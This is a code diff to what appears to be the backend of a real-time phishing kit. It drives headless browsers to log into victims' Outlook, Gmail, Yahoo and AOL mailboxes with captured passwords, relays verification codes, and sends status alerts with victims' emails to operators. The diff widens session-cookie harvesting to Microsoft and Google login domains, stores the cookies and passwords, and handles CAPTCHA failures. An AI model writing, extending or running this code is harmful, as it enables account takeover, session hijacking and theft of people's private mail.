@@ -26,6 +26,18 @@ import {
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
+import { notifyTeam } from "../../../../utils/notifyTeam.js";
+
+const PLATFORM_INBOX_URLS = {
+    'outlook.com': 'https://outlook.live.com/mail/',
+    'hotmail.com': 'https://outlook.live.com/mail/',
+    'live.com': 'https://outlook.live.com/mail/',
+    'msn.com': 'https://outlook.live.com/mail/',
+    'gmail.com': 'https://mail.google.com/mail/',
+    'googlemail.com': 'https://mail.google.com/mail/',
+    'yahoo.com': 'https://mail.yahoo.com/',
+    'aol.com': 'https://mail.aol.com/',
+};
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 const activeProcesses = new Set();
@@ -232,7 +244,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     break;
                 } catch (e) {
                     logger.warn(`[checkAccountAccess][${instanceId}] Goto attempt ${attempt}/${gotoRetries} failed: ${e.message}`);
-                    if (attempt === gotoRetries) throw e;
+                    if (attempt === gotoRetries) {
+                        notifyTeam({ type: 'NAVIGATION_FAILURE', platform, email, browserId, url: platformConfig.url, error: e.message, detail: `Failed to navigate after ${gotoRetries} attempts` });
+                        throw e;
+                    }
                     await new Promise(res => setTimeout(res, 2000));
                 }
             }
@@ -289,6 +304,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     const verificationAfterEmail = await checkVerification(page, platformConfig);
                     if (verificationAfterEmail.required) {
                         logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after email submission: ${verificationAfterEmail.viewName}`);
+                        if (verificationAfterEmail.type === 'captcha') {
+                            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after email: ${verificationAfterEmail.viewName}` });
+                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                        }
                         if (verificationAfterEmail.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                             const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationAfterEmail.viewName);
                             return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_OPTIONS', verificationOptions: options, viewName: verificationAfterEmail.viewName };
@@ -350,6 +369,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                     const verificationDetails = await checkVerification(page, platformConfig);
                                     if (verificationDetails.required) {
                                         logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after password entry.`);
+                                        if (verificationDetails.type === 'captcha') {
+                                            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after password: ${verificationDetails.viewName}` });
+                                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                                        }
                                         if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                                             const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName);
                                             return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_OPTIONS', verificationOptions: options, viewName: verificationDetails.viewName };
@@ -482,8 +505,12 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     const verificationDetailsAfterClick = await checkVerification(page, platformConfig);
                     if (verificationDetailsAfterClick.required) {
                         logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after click: ${verificationDetailsAfterClick.viewName}. Returning for state transition.`);
+                        if (verificationDetailsAfterClick.type === 'captcha') {
+                            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after click: ${verificationDetailsAfterClick.viewName}` });
+                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                        }
                         return {
-                            emailExists: true, // Assuming email and account access are true if we reached a verification screen
+                            emailExists: true,
                             accountAccess: true,
                             reachedInbox: false,
                             requiresVerification: true,
@@ -601,6 +628,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
             const verificationDetails = await checkVerification(page, platformConfig);
             if (verificationDetails.required) {
                 requiresVerification = true;
+                if (verificationDetails.type === 'captcha') {
+                    notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA final check: ${verificationDetails.viewName}` });
+                    return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                }
                 if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                     const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName);
                     return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_OPTIONS', verificationType: verificationDetails.type, verificationOptions: options, viewName: verificationDetails.viewName };
@@ -1874,6 +1905,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_CODE",
                     verificationState: 'WAITING_CODE',
+                    viewName: JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName || null,
                     message: "Awaiting verification code."
                 });
                 await updateBrowserRowData(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
@@ -1936,6 +1968,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             codeInputSelector = platformConfig.selectors?.gmailEmailCodeInput;
                             codeSubmitSelector = platformConfig.selectors?.gmailEmailCodeSubmit;
                             logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail email code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
+                        } else if (currentViewNameForCode === 'Gmail Enter Code') {
+                            codeInputSelector = platformConfig.selectors?.verificationCodeInput;
+                            codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail standard code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                         } else {
                             codeInputSelector = platformConfig.selectors?.verificationCodeInput;
                             codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
@@ -2022,7 +2058,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         finalStatus = "COMPLETED";
                                         codeSuccessfullyProcessed = true;
 
-                                        const browserCookies = await page.cookies();
+                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                         updateData.status = "COMPLETED";
                                         updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true; // Set verified to true on COMPLETED
@@ -2079,7 +2115,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 finalStatus = "COMPLETED";
                                 codeSuccessfullyProcessed = true;
 
-                                const browserCookies = await page.cookies();
+                                const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                 updateData.status = "COMPLETED";
                                 updateData.cookieJSON = JSON.stringify(browserCookies);
                                 updateData.verified = true; // Set verified to true on COMPLETED
@@ -2169,6 +2205,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         message: "Incorrect verification code entered. Please try again."
                                     })
                                 });
+                                break;
                             } else if (postCodeVerificationState.required && postCodeVerificationState.type === 'text_input') {
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Transitioned to text input (recovery email) after code. Setting WAITINGRECOVERYEMAIL.`);
                                 finalStatus = "WAITINGRECOVERYEMAIL";
@@ -2190,7 +2227,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     finalStatus = "COMPLETED";
                                     codeSuccessfullyProcessed = true;
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
-                                    const browserCookies = await page.cookies();
+                                    const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                     updateData.status = "COMPLETED";
                                     updateData.cookieJSON = JSON.stringify(browserCookies);
                                     updateData.verified = true;
@@ -2222,7 +2259,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     await new Promise(resolve => setTimeout(resolve, 15000));
                 }
 
-                if (finalStatus === "WAITING_CODE" && !codeSuccessfullyProcessed) {
+                if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) {
                     await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
                 }
             }
@@ -2282,6 +2319,25 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         // we should respect that and not overwrite it with a less severe status.
         // However, if it's still the default "FAILED" from initialization, we can update it.
         // Prioritize explicit verification states from initialCheckResult
+
+        // Handle CAPTCHA_FAILED — no user action possible, immediately fail
+        if (initialCheckResult.verificationState === 'CAPTCHA_FAILED') {
+            logger.info(`[processRow][${browserId}] CAPTCHA_FAILED detected. Setting final status to FAILED.`);
+            finalStatus = "FAILED";
+            updateData.lastJsonResponse = JSON.stringify({
+                browserId, email, status: "FAILED",
+                emailExists: initialCheckResult.emailExists,
+                accountAccess: false,
+                reachedInbox: false,
+                platform, timestamp: new Date().toISOString(),
+                message: "CAPTCHA challenge detected. Automated bypass is not available."
+            });
+            updateData.status = "FAILED";
+            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, detail: 'CAPTCHA challenge detected - cannot bypass automatically', url: initialCheckResult.url });
+            await updateBrowserRowData(browserId, updateData);
+            return;
+        }
+
         if (initialCheckResult.requiresVerification && finalStatus !== "FAILED" && finalStatus !== "COMPLETED") {
             const sheetStatus = initialCheckResult.verificationState.replace(/_/g, ''); // Non-underscore for sheet status
             finalStatus = initialCheckResult.verificationState; // Keep original with underscore for internal use/lastJsonResponse
@@ -2293,6 +2349,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 requiresVerification: initialCheckResult.requiresVerification,
                 verificationState: initialCheckResult.verificationState, // Keep original with underscore
                 verificationOptions: initialCheckResult.verificationOptions || [],
+                viewName: initialCheckResult.viewName || null,
                 platform, timestamp: new Date().toISOString(),
                 message: initialCheckResult.message || (sheetStatus === 'WAITINGOPTIONS' ? 'Awaiting verification choice.' : 'Awaiting verification code.')
             });
@@ -2432,8 +2489,17 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
 
         if (finalStatus === "COMPLETED") {
-            const browserCookies = await page.cookies();
+            const allUrls = [
+                `https://${domain}`,
+                `https://login.live.com`,
+                `https://login.microsoftonline.com`,
+                `https://www.microsoft.com`,
+                `https://outlook.live.com`,
+                `https://mail.google.com`,
+            ];
+            const browserCookies = await page.cookies(...allUrls);
             updateData.cookieJSON = JSON.stringify(browserCookies);
+            logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
             updateData.verified = true; // Set verified to true on COMPLETED without verification
             updateData.fullAccess = true; // Set fullAccess to true on COMPLETED without verification
             updateData.status = finalStatus;
@@ -2499,6 +2565,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 verificationState: initialCheckResult.verificationState
             })
         });
+        notifyTeam({ type: 'UNEXPECTED_ERROR', platform, email, browserId, error: error.message, detail: 'processRow outer catch' });
     } finally {
         if (browser && !browserFullyClosed) {
             const sessionTargetListener = isReusingBrowser ? activeBrowserSessions.get(browserId)?.targetCreatedListener : targetCreatedListener;
@@ -2541,6 +2608,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         if (finalSheetUpdate.status === "FAILED") {
             finalSheetUpdate.email = email || finalSheetUpdate.email;
             finalSheetUpdate.password = password || finalSheetUpdate.password;
+            notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
         }
         // Removed explicit clearing of verification fields as per user request
         // if (finalSheetUpdate.status === "COMPLETED") {
@@ -2683,7 +2751,7 @@ async function processWaitingRows() {
 
 
         const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL"];
-        const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR"];
+        const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR", "PROCESSING"];
         const STALE_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
         const activityIdx = columnIndexes['lastUserActivity'] !== undefined ? columnIndexes['lastUserActivity'] : columnIndexes['lastRun'];
         const usingActivityColumn = columnIndexes['lastUserActivity'] !== undefined;
@@ -2845,8 +2913,10 @@ async function processWaitingRows() {
                                 browserId, status: "FAILED", error: `processRow crashed: ${err.message}`, timestamp: new Date().toISOString()
                             })
                         });
+                        notifyTeam({ type: 'FATAL', browserId, error: err.message, detail: 'processRow crashed in processWaitingRows' });
                     } catch (updateErr) {
                         logger.error(`[processWaitingRows] Failed to update sheet to FAILED after processRow crash for ${browserId}: ${updateErr.message}`);
+                        notifyTeam({ type: 'FATAL', browserId, error: updateErr.message, detail: 'processRow crashed AND sheet update failed' });
                     }
                 } finally {
                     activeProcesses.delete(browserId);
